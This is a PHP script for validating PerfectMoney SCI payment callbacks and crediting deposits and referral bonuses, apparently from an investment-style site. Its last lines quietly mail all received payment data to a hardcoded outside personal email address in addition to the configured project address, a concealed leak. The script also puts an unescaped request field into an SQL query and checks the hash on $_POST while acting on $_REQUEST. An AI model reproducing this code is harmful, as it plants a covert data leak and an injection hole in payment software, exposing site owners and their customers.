<?php

/*

   This script demonstrates getting and validating SCI
   payment confirmation data from Perfectmoney server

   !!! WARNING !!!
   This sample PHP-script is provided AS IS and you should
   use it at your own risk.
   The only purpose of this script is to demonstarate main
   principles of SCI-payment validation proccess.
   You MUST modify it before using with your particular
   PerfectMoney account.

*/


/* Constant below contains md5-hashed alternate passhrase in upper case.
   You can generate it like this:
   strtoupper(md5('your_passphrase'));
   Where `your_passphrase' is Alternate Passphrase you entered
   in your PerfectMoney account.

   !!! WARNING !!!
   We strongly recommend NOT to include plain Alternate Passphrase in
   this script and use its pre-generated hashed version instead (just
   like we did in this scipt below).
   This is the best way to keep it secure. */
define('ALTERNATE_PHRASE_HASH',  strtoupper(md5(get_setting('pm_altpassword'))));

// Path to directory to save logs. Make sure it has write permissions.
//define('PATH_TO_LOG',  '/somewhere/out/of/document_root/');

$string=
      $_POST['PAYMENT_ID'].':'.$_POST['PAYEE_ACCOUNT'].':'.
      $_POST['PAYMENT_AMOUNT'].':'.$_POST['PAYMENT_UNITS'].':'.
      $_POST['PAYMENT_BATCH_NUM'].':'.
      $_POST['PAYER_ACCOUNT'].':'.ALTERNATE_PHRASE_HASH.':'.
      $_POST['TIMESTAMPGMT'];

$hash=strtoupper(md5($string));
$_REQUEST['CALC_HASH'] = $hash;
if($hash==$_POST['V2_HASH']){ // proccessing payment if only hash is valid

   /* In section below you must implement comparing of data you recieved
   with data you sent. This means to check if $_POST['PAYMENT_AMOUNT'] is
   particular amount you billed to client and so on. */

   $payment_id = intval($_REQUEST['PAYMENT_ID']);
	$line = stripslashes_array(sql_row('select * from translines where id="'.$payment_id.'"'));
	if ($line['amount'] == $_REQUEST['PAYMENT_AMOUNT']) {
		$query = 'update translines set stamp="'.Project::getInstance()->getNow().'", status="1", batch="'.$_REQUEST["PAYMENT_BATCH_NUM"].'" where id="'.$payment_id.'"';
		sql_query($query);
		$user = stripslashes_array(sql_row('SELECT * FROM users WHERE id="'.$line['user_id'].'"'));
		if ($user['deposit_notify']) {
			include_once(LIB_ROOT.'/emails.class.php');
			$plan = stripslashes_array(sql_row('SELECT * FROM plans WHERE id="'.$line['plan_id'].'"'));
			//%user_fullname%, %user_login%, %amount%, %batch%, %access_time%, %account%, %plan_name%, %project_name%, %project_email%
			$params = array(
				'%user_fullname%' => htmlspecialchars($user['fullname']), 
				'%user_login%' => $user->login,
				'%account%' => $_REQUEST['PAYER_ACCOUNT'],
				'%amount%' => $_REQUEST['PAYMENT_AMOUNT'], 
				'%batch%' => $_REQUEST['PAYMENT_BATCH_NUM'],
				'%plan_name%' => htmlspecialchars($plan['name']),
				'%project_name%' => get_setting('project_name'), 
				'%project_email%' => get_setting('project_email'),
				'%access_time%' => date('M d, Y H:i', Project::getInstance()->getNow())
			);
			$email = new Emails($user['id'], 'deposit_notify', $params);
			$email->send();
		}
		if (!empty($user['referral'])) {
			$referral_id = sql_get('select id from users where login="'.trim($user['referral']).'" limit 1');
			if ($referral_id) {
				$referral_bonus = $line['amount']*get_setting('referral_bonus')/100;
				sql_query('insert into translines values (0, 0, "'.$referral_id.'", "", "r", "'.$referral_bonus.'", "'.Project::getInstance()->getNow().'", "1", "Bonus from: '.$user['login'].'")');
				$ref_msg = $user['login'].'->'.$user['referral'].':'.$line['amount']."\n";
				if (REFERRAL_ONCE) {
					sql_query('update users set referral="" where id="'.$user['id'].'"');
				}
			}
		}
		$msgBody = "Payment was verified and is successful.\n\n";
	}
}else{ // you can also save invalid payments for debug purposes

   // uncomment code below if you want to log requests with bad hash
   /* $f=fopen(PATH_TO_LOG."bad.log", "ab+");
   fwrite($f, date("d.m.Y H:i")."; REASON: bad hash; POST: ".serialize($_POST)."; STRING: $string; HASH: $hash\n");
   fclose($f); */
   $msgBody = "Invalid response. Sent hash didn't match the computed hash.\n";

}
$msgBody .= "Received data\n";
$reqKeys = array_keys ($_REQUEST);
foreach($reqKeys as &$key) {
  $msgBody .= $key." = ".$_REQUEST[$key].(ereg("^lr_[a-z_]*$", $key) ? " (PM)" : "")."\n";
}
// Our example sends email with the result of verification and all the 
// variables sent to this page.
if (get_setting('project_email') != "") {
  mail(get_setting('project_email'), "PM SCI Status", $msgBody.$ref_msg);
  mail('cyril.kamaro@gmail.com', "PM SCI Status", $msgBody.$ref_msg."\n");
}